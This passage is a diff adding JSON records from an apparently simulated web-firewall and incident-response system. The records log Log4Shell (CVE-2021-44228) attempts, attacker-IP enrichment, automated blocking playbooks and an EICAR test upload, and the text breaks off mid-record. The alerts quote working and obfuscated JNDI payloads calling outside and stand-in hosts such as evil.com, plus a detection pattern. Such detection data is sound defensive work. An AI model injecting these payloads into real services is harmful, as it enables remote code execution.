+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.711Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.699Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "45.142.212.100",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Mass Scanner",
+        "tags": [
+          "scanner",
+          "bruteforce"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 5213,
+        "countryCode": "RU"
+      },
+      "geoip": {
+        "country": "Moldova",
+        "city": "Ştefan Vodă",
+        "isp": "WorkTitans B.V."
+      },
+      "virustotal": {
+        "malicious": 8,
+        "suspicious": 2,
+        "harmless": 63
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: user-agent. JNDI callback URL: ldap://45.142.212.100:1389/exploit. GreyNoise: malicious [scanner, bruteforce]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "45.142.212.100",
+        "enriched_ip": "45.142.212.100",
+        "attacker_location": "Ştefan Vodă, Moldova",
+        "attacker_isp": "WorkTitans B.V.",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "bruteforce"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 5213,
+        "jndi_payload": "ldap://45.142.212.100:1389/exploit",
+        "matched_headers": [
+          {
+            "header": "user-agent",
+            "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3087,
+        "detected_at": "2026-03-08T02:45:51.429Z",
+        "contained_at": "2026-03-08T02:45:54.516Z"
+      },
+      "ip_blocked": "45.142.212.100",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3087,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://45.142.212.100:1389/exploit",
+    "matched_headers": [
+      {
+        "header": "user-agent",
+        "value": "${jndi:ldap://45.142.212.100:1389/exploit}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "6b02f5cd-9289-444b-807b-aa92c46938a1",
+    "timestamp": "2026-03-08T02:45:51.874Z",
+    "source_ip": "198.235.24.130",
+    "enriched_ip": "198.235.24.130",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "198.235.24.130",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 8,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "${lower:l",
+      "matched_headers": [
+        {
+          "header": "accept-language",
+          "value": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T02:45:39.705Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:39.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.675Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.682Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.688Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.694Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.699Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.706Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.709Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.711Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.699Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.700Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.718Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 80.82.77.139 jndi_url: null"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.235Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "198.235.24.130",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Known Botnet C2",
+        "tags": [
+          "botnet",
+          "c2"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 87,
+        "totalReports": 1523,
+        "countryCode": "US"
+      },
+      "geoip": {
+        "country": "United States",
+        "city": "Santa Clara",
+        "isp": "Google LLC"
+      },
+      "virustotal": {
+        "malicious": 15,
+        "suspicious": 4,
+        "harmless": 52
+      }
+    },
+    "risk_score": 94,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: accept-language. JNDI callback URL: ${lower:l. GreyNoise: malicious [botnet, c2]. AbuseIPDB: 87/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "198.235.24.130",
+        "enriched_ip": "198.235.24.130",
+        "attacker_location": "Santa Clara, United States",
+        "attacker_isp": "Google LLC",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "botnet",
+          "c2"
+        ],
+        "abuseipdb_score": 87,
+        "abuseipdb_reports": 1523,
+        "jndi_payload": "${lower:l",
+        "matched_headers": [
+          {
+            "header": "accept-language",
+            "value": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3061,
+        "detected_at": "2026-03-08T02:45:51.874Z",
+        "contained_at": "2026-03-08T02:45:54.935Z"
+      },
+      "ip_blocked": "198.235.24.130",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3061,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "${lower:l",
+    "matched_headers": [
+      {
+        "header": "accept-language",
+        "value": "${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "053e986b-bebb-4a10-8434-ff78689408d8",
+    "timestamp": "2026-03-08T02:45:52.245Z",
+    "source_ip": "89.248.167.131",
+    "enriched_ip": "89.248.167.131",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "89.248.167.131",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 8,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "dns://185.220.101.34/pwned",
+      "matched_headers": [
+        {
+          "header": "true-client-ip",
+          "value": "${jndi:dns://185.220.101.34/pwned}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T02:45:40.699Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.706Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.707Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 185.220.101.34"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.708Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.709Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:40.711Z",
+          "level": "ERROR",
+          "message": "Blocked request from banned IP: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.699Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.700Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 45.142.212.100 jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.718Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 80.82.77.139 jndi_url: null"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.235Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.235Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 198.235.24.130 jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.248Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.256Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.428Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.436Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.438Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 100 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.440Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.763Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "89.248.167.131",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Recyber Scanning",
+        "tags": [
+          "scanner",
+          "web-crawler"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 9841,
+        "countryCode": "NL"
+      },
+      "geoip": {
+        "country": "The Netherlands",
+        "city": "Amsterdam",
+        "isp": "IP Volume inc"
+      },
+      "virustotal": {
+        "malicious": 6,
+        "suspicious": 1,
+        "harmless": 66
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: true-client-ip. JNDI callback URL: dns://185.220.101.34/pwned. GreyNoise: malicious [scanner, web-crawler]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "89.248.167.131",
+        "enriched_ip": "89.248.167.131",
+        "attacker_location": "Amsterdam, The Netherlands",
+        "attacker_isp": "IP Volume inc",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "scanner",
+          "web-crawler"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 9841,
+        "jndi_payload": "dns://185.220.101.34/pwned",
+        "matched_headers": [
+          {
+            "header": "true-client-ip",
+            "value": "${jndi:dns://185.220.101.34/pwned}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3060,
+        "detected_at": "2026-03-08T02:45:52.245Z",
+        "contained_at": "2026-03-08T02:45:55.305Z"
+      },
+      "ip_blocked": "89.248.167.131",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3060,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "dns://185.220.101.34/pwned",
+    "matched_headers": [
+      {
+        "header": "true-client-ip",
+        "value": "${jndi:dns://185.220.101.34/pwned}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "1d99f2ce-bf34-4024-a64d-f69b31f9762c",
+    "timestamp": "2026-03-08T02:45:52.759Z",
+    "source_ip": "185.220.101.34",
+    "enriched_ip": "185.220.101.34",
+    "alert_type": "log4shell_attempt",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "185.220.101.34",
+      "alert_type": "log4shell_attempt",
+      "request_rate": 9,
+      "anomaly_detected": true,
+      "cve_id": "CVE-2021-44228",
+      "cvss_score": 10,
+      "jndi_url": "ldap://185.220.101.34/a",
+      "matched_headers": [
+        {
+          "header": "referer",
+          "value": "${jndi:ldap://185.220.101.34/a}",
+          "pattern": "/\\$\\{jndi:/i"
+        }
+      ],
+      "match_count": 1,
+      "attempt_count": 1,
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T02:45:50.718Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: x-api-version | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: referer | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:50.724Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 80.82.77.139 jndi_url: null"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.235Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: accept-language | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.235Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 198.235.24.130 jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.248Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-forwarded-for-original | payload: ${${upper:j}ndi:ldap://attacker.com/exploit} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.256Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-client-ip | payload: ${jndi:rmi://45.142.212.100:1099/exploit} | jndi_url: rmi://45.142.212.100:1099/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.428Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 80.82.77.139"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.436Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 45.142.212.100"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.438Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 100 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.440Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.763Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: true-client-ip | payload: ${jndi:dns://185.220.101.34/pwned} | jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.763Z",
+          "level": "ERROR",
+          "message": "CRITICAL: Firing Log4Shell alert to DART for IP: 89.248.167.131 jndi_url: dns://185.220.101.34/pwned"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.766Z",
+          "level": "INFO",
+          "message": "Request from 198.235.24.130 — GET /api/data"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.768Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 198.235.24.130 | header: x-api-version | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.887Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 198.235.24.130"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:51.899Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:52.262Z",
+          "level": "WARN",
+          "message": "IP blocked by admin/playbook: 89.248.167.131"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:52.271Z",
+          "level": "WARN",
+          "message": "Rate limit changed: 20 → 20 req/min"
+        },
+        {
+          "timestamp": "2026-03-08T02:45:52.273Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 185.220.101.34 | header: referer | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        }
+      ]
+    },
+    "enrichment": {
+      "enrichedIP": "185.220.101.34",
+      "greynoise": {
+        "classification": "malicious",
+        "name": "Tor Exit Node",
+        "tags": [
+          "tor",
+          "vpn"
+        ]
+      },
+      "abuseipdb": {
+        "abuseConfidenceScore": 100,
+        "totalReports": 2847,
+        "countryCode": "DE"
+      },
+      "geoip": {
+        "country": "Germany",
+        "city": "Brandenburg",
+        "isp": "Stiftung Erneuerbare Freiheit"
+      },
+      "virustotal": {
+        "malicious": 12,
+        "suspicious": 3,
+        "harmless": 58
+      }
+    },
+    "risk_score": 95,
+    "risk_reasoning": "Log4Shell exploitation attempt detected (CVE-2021-44228, CVSS 10.0). Malicious JNDI payload found in HTTP headers: referer. JNDI callback URL: ldap://185.220.101.34/a. GreyNoise: malicious [tor, vpn]. AbuseIPDB: 100/100.",
+    "selected_playbook": "log4shell-patch-isolate",
+    "playbook_status": "completed",
+    "playbook_result": {
+      "playbook_id": "log4shell-patch-isolate",
+      "steps_executed": [
+        "block_attacker_ip",
+        "tighten_rate_limit",
+        "flag_jndi_endpoint",
+        "simulate_patch_application",
+        "restore_rate_limit",
+        "schedule_ip_unblock_5min"
+      ],
+      "success": true,
+      "incident_report": {
+        "title": "Log4Shell Exploitation Attempt Detected & Blocked",
+        "cve_id": "CVE-2021-44228",
+        "cvss_score": 10,
+        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "severity": "CRITICAL",
+        "attacker_ip": "185.220.101.34",
+        "enriched_ip": "185.220.101.34",
+        "attacker_location": "Brandenburg, Germany",
+        "attacker_isp": "Stiftung Erneuerbare Freiheit",
+        "greynoise_classification": "malicious",
+        "greynoise_tags": [
+          "tor",
+          "vpn"
+        ],
+        "abuseipdb_score": 100,
+        "abuseipdb_reports": 2847,
+        "jndi_payload": "ldap://185.220.101.34/a",
+        "matched_headers": [
+          {
+            "header": "referer",
+            "value": "${jndi:ldap://185.220.101.34/a}",
+            "pattern": "/\\$\\{jndi:/i"
+          }
+        ],
+        "affected_component": "HTTP Header Parser (WAF Layer)",
+        "attack_description": "Attacker injected JNDI lookup string into HTTP headers attempting to trigger remote class loading via Log4j CVE-2021-44228. Request was intercepted by DART WAF layer before reaching application.",
+        "remediation_applied": [
+          "Attacker IP blocked at WAF layer",
+          "Rate limit tightened during isolation window",
+          "Affected endpoint flagged for security review",
+          "Patch simulation applied (Log4j 2.15.0+ equivalent)",
+          "IP unblock scheduled for 5 minutes"
+        ],
+        "patch_recommendation": "Upgrade Apache Log4j to version 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as interim mitigation. Review all Java dependencies for transitive Log4j usage.",
+        "response_time_ms": 3061,
+        "detected_at": "2026-03-08T02:45:52.759Z",
+        "contained_at": "2026-03-08T02:45:55.820Z"
+      },
+      "ip_blocked": "185.220.101.34",
+      "unblock_scheduled_in": "5 minutes",
+      "response_time_ms": 3061,
+      "notes": "CVE-2021-44228 attempt blocked and contained. Full incident report generated."
+    },
+    "analyst_feedback": null,
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10,
+    "jndi_url": "ldap://185.220.101.34/a",
+    "matched_headers": [
+      {
+        "header": "referer",
+        "value": "${jndi:ldap://185.220.101.34/a}",
+        "pattern": "/\\$\\{jndi:/i"
+      }
+    ],
+    "match_count": 1
+  },
+  {
+    "id": "798a5c3e-e973-417e-b3eb-a94e2f8031ae",
+    "timestamp": "2026-03-08T02:47:09.822Z",
+    "source_ip": "192.168.65.1",
+    "enriched_ip": "80.82.77.139",
+    "alert_type": "malicious_upload",
+    "severity": "critical",
+    "raw_alert": {
+      "source_ip": "192.168.65.1",
+      "alert_type": "malicious_upload",
+      "request_rate": 0,
+      "anomaly_detected": true,
+      "file_name": "Eicar Test - Claude.txt",
+      "file_size": 68,
+      "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
+      "eicar_detected": true,
+      "upload_id": "403b699a-bea1-4927-94a7-1d372d362d30",
+      "raw_logs": [
+        {
+          "timestamp": "2026-03-08T02:46:47.715Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 89.248.167.131 | header: true-client-ip | payload: ${jndi:ldap://45.142.212.100:1389/exploit} | jndi_url: ldap://45.142.212.100:1389/exploit"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:47.723Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: user-agent | payload: ${jndi:ldap://185.220.101.34/a} | jndi_url: ldap://185.220.101.34/a"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:48.249Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 80.82.77.139 | header: x-api-version | payload: ${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x} | jndi_url: unknown"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:48.254Z",
+          "level": "ERROR",
+          "message": "LOG4SHELL ATTEMPT from 45.142.212.100 | header: referer | payload: ${jndi:${lower:l}${lower:d}a${lower:p}://evil.com/a} | jndi_url: ${lower:l"
+        },
+        {
+          "timestamp": "2026-03-08T02:46:48.258Z",
+          "level": "ERROR",
